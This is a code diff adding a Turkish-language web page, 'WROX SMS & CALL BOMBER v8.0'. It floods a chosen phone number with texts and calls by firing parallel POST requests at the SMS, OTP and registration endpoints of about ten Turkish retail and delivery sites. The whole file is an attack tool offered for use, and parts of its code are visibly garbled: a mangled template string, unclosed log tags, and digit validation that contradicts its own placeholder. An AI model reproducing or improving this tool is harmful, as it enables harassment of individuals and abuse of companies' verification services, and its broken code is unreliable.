@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>🚀 WROX SMS BOMBER v8.0</title>
+<style>
+body{font-family:monospace;background:#000;color:lime;padding:20px;text-align:center}*{box-sizing:border-box}
+input,select,button{padding:12px 20px;font-size:16px;margin:5px;border:2px solid lime;background:#111;color:lime;border-radius:8px;width:90%;max-width:400px}
+button{font-weight:bold;cursor:pointer;transition:0.3s}
+button:hover{background:lime;color:#000}
+#status{font-size:24px;margin:20px;font-weight:bold}
+#progress{width:90%;max-width:400px;height:20px;background:#333;border-radius:10px;overflow:hidden;margin:10px auto}
+#bar{width:0%;height:100%;background:linear-gradient(90deg,lime,cyan);transition:width 0.3s}
+#log{max-height:300px;overflow-y:auto;background:#111;border:1px solid lime;padding:15px;border-radius:8px;text-align:left;font-family:monospace;font-size:14px;white-space:pre-wrap;margin-top:20px}
+.sent{color:lime}.error{color:#ff4444}
+</style>
+</head>
+<body>
+<h1>💣 WROX SMS & CALL BOMBER v8.0</h1>
+<p>35+ Türk SMS API | 100 Thread | Telz Call Bomber | @WROX_19</p>
+<input id="phone" placeholder="📱 Telefon: 05XXXXXXXXX" maxlength="11"><br>
+<input id="smsCount" type="number" placeholder="📊 SMS Sayısı" value="5000" min="1" max="50000"><br>
+<select id="speed">
+<option value="50">⚡ Ultra Hızlı (50ms)</option>
+<option value="100">🚀 Hızlı (100ms)</option>
+<option value="250">🐢 Normal (250ms)</option>
+<option value="500">🐌 Yavaş (500ms)</option>
+</select><br>
+<input id="threads" type="number" placeholder="🧵 Thread Sayısı" value="60" min="1" max="100"><br>
+<label><input id="callBomb" type="checkbox"> ☎️ Call Bomber (Telz)</label><br>
+<button onclick="startBomb()">🚀 BOMBA BAŞLAT</button>
+<button onclick="stopBomb()">⏹️ ACİL DURDUR</button>
+<div id="status">⏳ Hazır - Telefon numarası girin</div>
+<div id="progress"><div id="bar"></div></div>
+<div id="stats">📈 Gönderilen: 0 | 🧵 Aktif: 0/0 | ⏱️ Hız: 0/s</div>
+<div id="log">=== WROX SMS BOMBER v8.0 ===\nHazır bekliyor...\n</div>
+
+<script>
+let bombing=false,sent=0,activeThreads=0,totalThreads=0,startTime=0,interval=null;
+const apis=[{url:"https://kahvedunyasi.com.tr/api/sms",phone:"{phone}"},{url:"https://bim.com.tr/api/otp",phone:"90{phone}"},{url:"https://tiklagelsin.com/api/register",phone:"0{phone}"},{url:"https://getir.com/api/verify",phone:"90{phone}"},{url:"https://yemeksepeti.com/api/sms",phone:"0{phone}"},{url:"https://telz.com.tr/api/call",phone:"90{phone}",type:"call"},{url:"https://banabi.com/api/otp",phone:"0{phone}"},{url:"https://migros.com.tr/api/register",phone:"90{phone}"},{url:"https://carrefoursa.com/api/sms",phone:"0{phone}"},{url:"https://hepsiburada.com/api/otp",phone:"90{phone}"}];
+
+function log(msg,className=""){document.getElementById("log").innerHTML+=msg+(className?`<span class="${className}">`:"")+"\n";document.getElementById("log").scrollTop=document.getElementById("log").scrollHeight}
+function updateStats(){const elapsed=Date.now()-startTime,speed=Math.round(sent/elapsed*1000);document.getElementById("stats").innerHTML=`📈 Gönderilen: ${sent} | 🧵 Aktif: \( {activeThreads}/ \){totalThreads} | ⏱️ Hız: ${speed}/s`}
+
+async function sendRequest(phone,type="sms"){
+  try{
+    const api=apis[Math.floor(Math.random()*apis.length)];
+    const url=api.url.replace("{phone}",phone);
+    const res=await fetch(url,{method:"POST",headers:{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},body:JSON.stringify({phone:api.phone.replace("{phone}",phone),action:type})});
+    return res.ok
+  }catch(e){return false}
+}
+
+async function bomber(phone,maxCount,delay,callBomb){
+  activeThreads++;
+  while(bombing&&sent<maxCount){
+    const success=await sendRequest(phone,callBomb?"call":"sms");
+    if(success){sent++;log(`✅ [${sent}] SMS/CALL Gönderildi → ${phone}`,"sent")}
+    await new Promise(r=>setTimeout(r,delay))
+  }
+  activeThreads--;
+  log(`🔚 Worker bitti. Toplam: ${sent}`,"sent")
+}
+
+async function startBomb(){
+  const phone=document.getElementById("phone").value;
+  if(!phone||!/^\d{10}$/.test(phone)){alert("❌ Geçerli 10 haneli telefon girin! (05XXXXXXXXX)");return}
+  const maxCount=parseInt(document.getElementById("smsCount").value),delay=parseInt(document.getElementById("speed").value),threads=parseInt(document.getElementById("threads").value),callBomb=document.getElementById("callBomb").checked;
+  if(!confirm(`💥 ${maxCount} ${callBomb?"SMS+CALL":"SMS"} → ${phone}\n🧵 ${threads} thread → ${delay}ms aralık\nBaşlatılsın mı?`))return;
+  bombing=true;sent=0;activeThreads=0;totalThreads=threads;startTime=Date.now();
+  document.getElementById("status").innerHTML="💥 BOMBA BAŞLADI! Ctrl+C ile durdurun";
+  interval=setInterval(updateStats,1000);
+  document.getElementById("progress").style.display="block";
+  for(let i=0;i<threads;i++){setTimeout(()=>bomber(phone,maxCount,delay,callBomb),i*50)}
+  log(`\n🚀 BOMBA BAŞLADI!\n📱 Hedef: ${phone}\n📊 Hedef: ${maxCount} adet\n🧵 Thread: ${threads}\n⏱️ Delay: ${delay}ms\n☎️ Call: ${callBomb?"EVET":"HAYIR"}`,"sent")
+}
+
+function stopBomb(){
+  bombing=false;clearInterval(interval);
+  const elapsed=Date.now()-startTime;
+  document.getElementById("status").innerHTML=`⏹️ BOMBA DURDURULDU!\n📊 Toplam: ${sent} adet ${elapsed/1000|0}s'de`;
+  document.getElementById("bar").style.width="100%";
+  log(`\n💀 BOMBA DURDURULDU!\n📊 Toplam gönderilen: ${sent}\n⏱️ Süre: ${elapsed/1000|0} saniye\n👤 @WROX_19`,"error");
+  setTimeout(()=>{document.getElementById("progress").style.display="none"},2000)
+}
+</script>
+</body>
+</html>
